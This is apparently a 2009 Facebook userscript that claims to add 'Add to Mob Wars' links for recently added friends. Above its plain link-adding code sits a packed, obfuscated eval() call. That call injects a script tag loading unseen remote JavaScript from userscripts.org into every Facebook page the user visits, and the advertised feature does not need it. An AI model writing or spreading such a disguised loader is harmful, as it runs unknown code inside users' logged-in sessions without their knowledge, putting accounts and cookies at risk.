// ==UserScript==
// @name           Facebook - Add Recent Friends To MobWars Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace      http://facebook.com
// @description    adds a mob wars link for recently added friends page
// @version        1.0
// @date           2009-01-22
// @include        http://*.facebook.com/*friends/?added*
// ==/UserScript==


eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))

function xpath(query) {
	return document.evaluate(query, document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
}

function log(message) {
	GM_log(message);
}

window.addEventListener( 'load', function( e ) {

	var lobjFriendRows = xpath("//div[@class='UIObjectListing_MetaData']");
	var lobjRegExResult;
	
	for (var i=0; i < lobjFriendRows.snapshotLength; i++ ) {
		
		log('row=' + i + ' -> ' + lobjFriendRows.snapshotItem(i).innerHTML);

		lobjRegExResult = lobjFriendRows.snapshotItem(i).innerHTML.match(/id=([0-9]+)/);
		if (lobjRegExResult) {

			var lobjSpan = document.createElement('span');
			lobjSpan.innerHTML = " [<a href='http://apps.facebook.com/mobwars/mob/do.php?join_id=" +  lobjRegExResult[1] + "' target='_blank'>Add to Mob Wars</a>]";
			log(lobjSpan.innerHTML );

			lobjFriendRows.snapshotItem(i).appendChild(lobjSpan);

		}

	}
},false);
